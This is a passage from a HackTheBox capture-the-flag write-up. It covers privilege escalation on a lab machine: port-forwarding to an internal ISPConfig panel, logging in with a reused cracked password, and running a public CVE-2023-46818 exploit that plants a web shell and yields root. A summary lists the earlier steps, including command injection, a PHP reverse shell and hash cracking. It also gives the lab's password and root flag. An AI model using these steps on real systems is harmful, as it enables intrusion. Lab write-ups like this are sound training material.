</span><span id="__span-37-2"><a id="__codelineno-37-2" name="__codelineno-37-2" href="#__codelineno-37-2"></a>Active<span class="w"> </span>Internet<span class="w"> </span>connections<span class="w"> </span><span class="o">(</span>only<span class="w"> </span>servers<span class="o">)</span>
</span><span id="__span-37-3"><a id="__codelineno-37-3" name="__codelineno-37-3" href="#__codelineno-37-3"></a>Proto<span class="w"> </span>Recv-Q<span class="w"> </span>Send-Q<span class="w"> </span>Local<span class="w"> </span>Address<span class="w">           </span>Foreign<span class="w"> </span>Address<span class="w">         </span>State<span class="w">      </span>
</span><span id="__span-37-4"><a id="__codelineno-37-4" name="__codelineno-37-4" href="#__codelineno-37-4"></a>tcp<span class="w">        </span><span class="m">0</span><span class="w">      </span><span class="m">0</span><span class="w"> </span><span class="m">127</span>.0.0.1:8080<span class="w">          </span><span class="m">0</span>.0.0.0:*<span class="w">               </span>LISTEN<span class="w">     </span>
</span><span id="__span-37-5"><a id="__codelineno-37-5" name="__codelineno-37-5" href="#__codelineno-37-5"></a>tcp<span class="w">        </span><span class="m">0</span><span class="w">      </span><span class="m">0</span><span class="w"> </span><span class="m">0</span>.0.0.0:80<span class="w">              </span><span class="m">0</span>.0.0.0:*<span class="w">               </span>LISTEN<span class="w">     </span>
</span><span id="__span-37-6"><a id="__codelineno-37-6" name="__codelineno-37-6" href="#__codelineno-37-6"></a>tcp<span class="w">        </span><span class="m">0</span><span class="w">      </span><span class="m">0</span><span class="w"> </span><span class="m">127</span>.0.0.53:53<span class="w">           </span><span class="m">0</span>.0.0.0:*<span class="w">               </span>LISTEN<span class="w">     </span>
</span><span id="__span-37-7"><a id="__codelineno-37-7" name="__codelineno-37-7" href="#__codelineno-37-7"></a>tcp<span class="w">        </span><span class="m">0</span><span class="w">      </span><span class="m">0</span><span class="w"> </span><span class="m">0</span>.0.0.0:22<span class="w">              </span><span class="m">0</span>.0.0.0:*<span class="w">               </span>LISTEN<span class="w">     </span>
</span><span id="__span-37-8"><a id="__codelineno-37-8" name="__codelineno-37-8" href="#__codelineno-37-8"></a>tcp<span class="w">        </span><span class="m">0</span><span class="w">      </span><span class="m">0</span><span class="w"> </span><span class="m">127</span>.0.0.1:25<span class="w">            </span><span class="m">0</span>.0.0.0:*<span class="w">               </span>LISTEN<span class="w">     </span>
</span><span id="__span-37-9"><a id="__codelineno-37-9" name="__codelineno-37-9" href="#__codelineno-37-9"></a>tcp<span class="w">        </span><span class="m">0</span><span class="w">      </span><span class="m">0</span><span class="w"> </span><span class="m">0</span>.0.0.0:8000<span class="w">            </span><span class="m">0</span>.0.0.0:*<span class="w">               </span>LISTEN<span class="w">     </span>
</span><span id="__span-37-10"><a id="__codelineno-37-10" name="__codelineno-37-10" href="#__codelineno-37-10"></a>tcp<span class="w">        </span><span class="m">0</span><span class="w">      </span><span class="m">0</span><span class="w"> </span><span class="m">127</span>.0.0.1:9090<span class="w">          </span><span class="m">0</span>.0.0.0:*<span class="w">               </span>LISTEN<span class="w">     </span>
</span><span id="__span-37-11"><a id="__codelineno-37-11" name="__codelineno-37-11" href="#__codelineno-37-11"></a>tcp<span class="w">        </span><span class="m">0</span><span class="w">      </span><span class="m">0</span><span class="w"> </span><span class="m">127</span>.0.0.1:33060<span class="w">         </span><span class="m">0</span>.0.0.0:*<span class="w">               </span>LISTEN<span class="w">     </span>
</span><span id="__span-37-12"><a id="__codelineno-37-12" name="__codelineno-37-12" href="#__codelineno-37-12"></a>tcp<span class="w">        </span><span class="m">0</span><span class="w">      </span><span class="m">0</span><span class="w"> </span><span class="m">127</span>.0.0.1:3306<span class="w">          </span><span class="m">0</span>.0.0.0:*<span class="w">               </span>LISTEN<span class="w">     </span>
</span><span id="__span-37-13"><a id="__codelineno-37-13" name="__codelineno-37-13" href="#__codelineno-37-13"></a>tcp<span class="w">        </span><span class="m">0</span><span class="w">      </span><span class="m">0</span><span class="w"> </span><span class="m">127</span>.0.0.1:587<span class="w">           </span><span class="m">0</span>.0.0.0:*<span class="w">               </span>LISTEN<span class="w">     </span>
</span><span id="__span-37-14"><a id="__codelineno-37-14" name="__codelineno-37-14" href="#__codelineno-37-14"></a>tcp6<span class="w">       </span><span class="m">0</span><span class="w">      </span><span class="m">0</span><span class="w"> </span>:::22<span class="w">                   </span>:::*<span class="w">                    </span>LISTEN<span class="w">     </span>
</span><span id="__span-37-15"><a id="__codelineno-37-15" name="__codelineno-37-15" href="#__codelineno-37-15"></a>tcp6<span class="w">       </span><span class="m">0</span><span class="w">      </span><span class="m">0</span><span class="w"> </span>::1:9090<span class="w">                </span>:::*<span class="w">                    </span>LISTEN<span class="w">     </span>
</span><span id="__span-37-16"><a id="__codelineno-37-16" name="__codelineno-37-16" href="#__codelineno-37-16"></a>udp<span class="w">        </span><span class="m">0</span><span class="w">      </span><span class="m">0</span><span class="w"> </span><span class="m">127</span>.0.0.53:53<span class="w">           </span><span class="m">0</span>.0.0.0:*<span class="w">    </span>
</span></code></pre></div></p>
<p>hmm, it appears that sth is running on port 8080, this could be some webservice running<br />
lets do some port forwarding to our machine, so we can (potentially) exploit it LOCALY.</p>
<p>we could do this while we had shell on the host, as tobias, but we dont know if running exploits with python for example would run, so its easier and a best practice to port forward and try locally.</p>
<h5 id="port-forwarding">Port forwarding</h5>
<p>in our machine, port forward the machines port to our machine<br />
<div class="language-shell highlight"><pre><span></span><code><span id="__span-38-1"><a id="__codelineno-38-1" name="__codelineno-38-1" href="#__codelineno-38-1"></a>ssh<span class="w"> </span>-L<span class="w"> </span><span class="m">9000</span>:127.0.0.1:8080<span class="w"> </span>tobias@nocturnal.htb
</span></code></pre></div></p>
<p>now on your local machine's browser, go to<br />
<div class="language-shell highlight"><pre><span></span><code><span id="__span-39-1"><a id="__codelineno-39-1" name="__codelineno-39-1" href="#__codelineno-39-1"></a>http://localhost:9000/login/
</span></code></pre></div><br />
we come accross this page<br />
<img alt="Pasted image 20250527200514" src="../MediaFiles/Pasted%20image%2020250527200514.png" /><br />
here i tried admin user and admin pass, but no luck</p>
<p>Trying with admin and tobias's password (password reuse)<br />
<div class="language-text highlight"><pre><span></span><code><span id="__span-40-1"><a id="__codelineno-40-1" name="__codelineno-40-1" href="#__codelineno-40-1"></a>admin
</span><span id="__span-40-2"><a id="__codelineno-40-2" name="__codelineno-40-2" href="#__codelineno-40-2"></a>slowmotionapocalypse
</span></code></pre></div><br />
got me in:<br />
<img alt="Pasted image 20250527201425" src="../MediaFiles/Pasted%20image%2020250527201425.png" /></p>
<p>But how to move forward?<br />
By searching all those tabs, i found empty pages and forms, and nothing seemed straightforward by inspecting them.</p>
<p>By inspecting the source code of the admin home page though, i found sth like a version <code>version 3.2.2</code><br />
<div class="language-html highlight"><pre><span></span><code><span id="__span-41-1"><a id="__codelineno-41-1" name="__codelineno-41-1" href="#__codelineno-41-1"></a> <span class="p">&lt;</span><span class="nt">link</span> <span class="na">rel</span><span class="o">=</span><span class="s">&#39;stylesheet&#39;</span> <span class="na">href</span><span class="o">=</span><span class="s">&#39;themes/default/assets/stylesheets/ispconfig.css?ver=3.2.2&#39;</span> <span class="p">/&gt;</span>
</span></code></pre></div></p>
<p>also the login page's source code shows this version <code>version 3.2</code><br />
<div class="language-html highlight"><pre><span></span><code><span id="__span-42-1"><a id="__codelineno-42-1" name="__codelineno-42-1" href="#__codelineno-42-1"></a><span class="p">&lt;</span><span class="nt">link</span> <span class="na">rel</span><span class="o">=</span><span class="s">&#39;stylesheet&#39;</span> <span class="na">href</span><span class="o">=</span><span class="s">&#39;../themes/default/assets/stylesheets/ispconfig.css?ver=3.2&#39;</span> <span class="p">/&gt;</span>
</span></code></pre></div></p>
<p>Furthermore, the monitor page shows another version `version 3.2.1'<br />
<img alt="Pasted image 20250527202256" src="../MediaFiles/Pasted%20image%2020250527202256.png" /></p>
<p>Next by searching ipsconfig vulnerabilities, i found this one <code>CVE-2023-46818</code><br />
which appears to affect ISPConfig &lt;= 3.2.11<br />
<img alt="Pasted image 20250527202354" src="../MediaFiles/Pasted%20image%2020250527202354.png" /></p>
<p>and by using this script that exploits this vulnerability: <br />
https://github.com/ajdumanhug/CVE-2023-46818<br />
<div class="language-shell highlight"><pre><span></span><code><span id="__span-43-1"><a id="__codelineno-43-1" name="__codelineno-43-1" href="#__codelineno-43-1"></a>python3<span class="w"> </span>CVE-2023-46818.py<span class="w"> </span>http://localhost:8080<span class="w"> </span>admin<span class="w"> </span>slowmotionapocalypse
</span></code></pre></div><br />
i grabbed the root flag!<br />
<div class="language-shell highlight"><pre><span></span><code><span id="__span-44-1"><a id="__codelineno-44-1" name="__codelineno-44-1" href="#__codelineno-44-1"></a>â””â”€#<span class="w"> </span>python3<span class="w"> </span>CVE-2023-46818.py<span class="w"> </span>http://localhost:9000<span class="w"> </span>admin<span class="w"> </span>slowmotionapocalypse
</span><span id="__span-44-2"><a id="__codelineno-44-2" name="__codelineno-44-2" href="#__codelineno-44-2"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Logging<span class="w"> </span><span class="k">in</span><span class="w"> </span>with<span class="w"> </span>username<span class="w"> </span><span class="s1">&#39;admin&#39;</span><span class="w"> </span>and<span class="w"> </span>password<span class="w"> </span><span class="s1">&#39;slowmotionapocalypse&#39;</span>
</span><span id="__span-44-3"><a id="__codelineno-44-3" name="__codelineno-44-3" href="#__codelineno-44-3"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Login<span class="w"> </span>successful!
</span><span id="__span-44-4"><a id="__codelineno-44-4" name="__codelineno-44-4" href="#__codelineno-44-4"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Fetching<span class="w"> </span>CSRF<span class="w"> </span>tokens...
</span><span id="__span-44-5"><a id="__codelineno-44-5" name="__codelineno-44-5" href="#__codelineno-44-5"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>CSRF<span class="w"> </span>ID:<span class="w"> </span>language_edit_1d8e96087d21652cb7f32dc9
</span><span id="__span-44-6"><a id="__codelineno-44-6" name="__codelineno-44-6" href="#__codelineno-44-6"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>CSRF<span class="w"> </span>Key:<span class="w"> </span>b7739948106f89f5e7d331be30036758eaab5be0
</span><span id="__span-44-7"><a id="__codelineno-44-7" name="__codelineno-44-7" href="#__codelineno-44-7"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Injecting<span class="w"> </span>shell<span class="w"> </span>payload...
</span><span id="__span-44-8"><a id="__codelineno-44-8" name="__codelineno-44-8" href="#__codelineno-44-8"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Shell<span class="w"> </span>written<span class="w"> </span>to:<span class="w"> </span>http://localhost:9000/admin/sh.php
</span><span id="__span-44-9"><a id="__codelineno-44-9" name="__codelineno-44-9" href="#__codelineno-44-9"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Launching<span class="w"> </span>shell...
</span><span id="__span-44-10"><a id="__codelineno-44-10" name="__codelineno-44-10" href="#__codelineno-44-10"></a>
</span><span id="__span-44-11"><a id="__codelineno-44-11" name="__codelineno-44-11" href="#__codelineno-44-11"></a>ispconfig-shell#<span class="w"> </span>whoami
</span><span id="__span-44-12"><a id="__codelineno-44-12" name="__codelineno-44-12" href="#__codelineno-44-12"></a>root
</span><span id="__span-44-13"><a id="__codelineno-44-13" name="__codelineno-44-13" href="#__codelineno-44-13"></a>
</span><span id="__span-44-14"><a id="__codelineno-44-14" name="__codelineno-44-14" href="#__codelineno-44-14"></a>ispconfig-shell#<span class="w"> </span>id
</span><span id="__span-44-15"><a id="__codelineno-44-15" name="__codelineno-44-15" href="#__codelineno-44-15"></a><span class="nv">uid</span><span class="o">=</span><span class="m">0</span><span class="o">(</span>root<span class="o">)</span><span class="w"> </span><span class="nv">gid</span><span class="o">=</span><span class="m">0</span><span class="o">(</span>root<span class="o">)</span><span class="w"> </span><span class="nv">groups</span><span class="o">=</span><span class="m">0</span><span class="o">(</span>root<span class="o">)</span>
</span><span id="__span-44-16"><a id="__codelineno-44-16" name="__codelineno-44-16" href="#__codelineno-44-16"></a>
</span><span id="__span-44-17"><a id="__codelineno-44-17" name="__codelineno-44-17" href="#__codelineno-44-17"></a>ispconfig-shell#<span class="w"> </span><span class="nb">pwd</span>
</span><span id="__span-44-18"><a id="__codelineno-44-18" name="__codelineno-44-18" href="#__codelineno-44-18"></a>/usr/local/ispconfig/interface/web/admin
</span><span id="__span-44-19"><a id="__codelineno-44-19" name="__codelineno-44-19" href="#__codelineno-44-19"></a>
</span><span id="__span-44-20"><a id="__codelineno-44-20" name="__codelineno-44-20" href="#__codelineno-44-20"></a>ispconfig-shell#<span class="w"> </span><span class="nb">cd</span>
</span><span id="__span-44-21"><a id="__codelineno-44-21" name="__codelineno-44-21" href="#__codelineno-44-21"></a>
</span><span id="__span-44-22"><a id="__codelineno-44-22" name="__codelineno-44-22" href="#__codelineno-44-22"></a>
</span><span id="__span-44-23"><a id="__codelineno-44-23" name="__codelineno-44-23" href="#__codelineno-44-23"></a>ispconfig-shell#<span class="w"> </span><span class="nb">pwd</span>
</span><span id="__span-44-24"><a id="__codelineno-44-24" name="__codelineno-44-24" href="#__codelineno-44-24"></a>/usr/local/ispconfig/interface/web/admin
</span><span id="__span-44-25"><a id="__codelineno-44-25" name="__codelineno-44-25" href="#__codelineno-44-25"></a>
</span><span id="__span-44-26"><a id="__codelineno-44-26" name="__codelineno-44-26" href="#__codelineno-44-26"></a>ispconfig-shell#<span class="w"> </span><span class="nb">cd</span><span class="w"> </span>/root
</span><span id="__span-44-27"><a id="__codelineno-44-27" name="__codelineno-44-27" href="#__codelineno-44-27"></a>
</span><span id="__span-44-28"><a id="__codelineno-44-28" name="__codelineno-44-28" href="#__codelineno-44-28"></a>
</span><span id="__span-44-29"><a id="__codelineno-44-29" name="__codelineno-44-29" href="#__codelineno-44-29"></a>ispconfig-shell#<span class="w"> </span><span class="nb">pwd</span>
</span><span id="__span-44-30"><a id="__codelineno-44-30" name="__codelineno-44-30" href="#__codelineno-44-30"></a>/usr/local/ispconfig/interface/web/admin
</span><span id="__span-44-31"><a id="__codelineno-44-31" name="__codelineno-44-31" href="#__codelineno-44-31"></a>
</span><span id="__span-44-32"><a id="__codelineno-44-32" name="__codelineno-44-32" href="#__codelineno-44-32"></a>ispconfig-shell#<span class="w"> </span>cat<span class="w"> </span>/root/root.txt
</span><span id="__span-44-33"><a id="__codelineno-44-33" name="__codelineno-44-33" href="#__codelineno-44-33"></a>22a9d497840af1d5d56c75417e97fefb
</span></code></pre></div><br />
<img alt="Pasted image 20250527201148" src="../MediaFiles/Pasted%20image%2020250527201148.png" /><br />
pwned!</p>
<hr />
<h1 id="summary">Summary</h1>
<p>Here is the list of the steps simplified, per phase, for future reference and for quick reading: </p>
<h4 id="reconnaissance_1">Reconnaissance</h4>
<ol>
<li>nmap scan -&gt; chose <strong>http</strong> service to focus on</li>
<li><strong>enumerate</strong> directories &amp; subdomains</li>
<li>browsed the website <strong>searching for user input</strong>, registered, logged in, uploaded &amp; downloaded file</li>
<li>tried to understand how it works, found a <strong>url</strong> on the download file request that specified username <strong>without further authentication</strong></li>
</ol>
<h4 id="foothold_1">Foothold</h4>
<ol>
<li><mark>user enumeration</mark>, based on the found url</li>
<li>found users, and with those inside the url i <strong>searched for uploaded files</strong> (since the download (view.php) page did not need the user's password in order to show their uploaded files)</li>
<li>one of the users (amanda) had uploaded a file containing their <strong>plaintext pass</strong>.</li>
<li><strong>logged in on the webapp again as this user</strong> (amanda), which also had access to the <mark>admin panel</mark></li>
<li>on the admin panel, there is a textbox and i suspected of <mark>command injection</mark>, which later was verified to exist, and was also verified via the source code of the page (to which i had access since i could download it, as user amanda has access to admin panel, that allows us to download all the webapp's source code)</li>
<li>used <strong>command injection</strong> to <mark>upload</mark> a php rev shell</li>
<li>used <strong>command injection</strong> to <mark>execute</mark> the uploaded php rev shell</li>
<li>once i got the rev shell, as www-data, i <strong>searched for valuable files</strong> and came accross a ==database file==that contained MD5 hashes for multiple users.</li>
<li><mark>hash cracking</mark> provided a password for one of them (tobias) to which i successfully logged on later via ssh and grabbed the <mark>user flag</mark>.</li>
</ol>
<h4 id="privesc_1">Privesc</h4>
<ol>
<li><strong>tried</strong> first <code>sudo -l</code> but the user was not allowed to run sudo</li>
<li>after searching files and directories i did not find anything interesting.</li>
<li>observed the <mark>network connections</mark> of the host from the inside, and observed localhost having connection with port 8080, and suspected it might be a web service running.</li>
<li>found a <strong>web app,</strong> to which i logged in with user admin and <strong>reusable pass</strong> of user tobias</li>
<li>used <mark>local port forwarding</mark>, to forward it to my <mark>local machine to exploit it</mark></li>
<li>found the web app to be <mark>vulnerable</mark> to a known cve, and with the appropriate script i got shell and grabbed the <mark>root flag</mark></li>
</ol>
<hr />
<h1 id="sidenotes">Sidenotes</h1>
<p>All in all, this did not seem like an "easy" machine, for me the foothold part was tough, especially due to the way the website modified the request of the backup password, and the way the payload for the command injection should be constructed. Once we got rev shell as www-data, it was easy to enumerate for files containing user info, and then hash cracking to reveal a user's pass. Then the privesc part, was kinda easy, as the web app had a known vulnerability, and the reuse of tobias creds for the admin user of ispconfig made the process even easier. </p>
<p>What will make this machine memorable for me, would be only the command injection part, which was unique due to the blacklisted characters. The rest of it was pretty much common among HackTheBox linux machines.</p>












                
              </article>
            </div>
          
          
<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
        </div>
        
          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
  Back to top
</button>
        
      </main>
      
        <footer class="md-footer">
  
  <div class="md-footer-meta md-typeset">
    <div class="md-footer-meta__inner md-grid">
      <div class="md-copyright">
  
  
    Made with
    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
      Material for MkDocs
    </a>
  
</div>
      
    </div>
  </div>
</footer>
      
    </div>
    <div class="md-dialog" data-md-component="dialog">
      <div class="md-dialog__inner md-typeset"></div>
    </div>
    
    
    
      
      <script id="__config" type="application/json">{"base": "..", "features": ["navigation.instant", "navigation.sections", "navigation.tabs", "search.highlight", "toc.sticky", "toc.follow", "content.code.copy", "navigation.top", "navigation.external"], "search": "../assets/javascripts/workers/search.973d3a69.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
    
    
      <script src="../assets/javascripts/bundle.92b07e13.min.js"></script>
      
        <script src="https://fastly.jsdelivr.net/npm/jquery/dist/jquery.min.js"></script>
      
        <script src="https://fastly.jsdelivr.net/npm/echarts/dist/echarts.min.js"></script>
      
        <script src="../assets/javascripts/interactive_graph.js"></script>
      
        <script src="../assets/javascripts/obsidian_tags.js"></script>
      
    
  </body>
</html>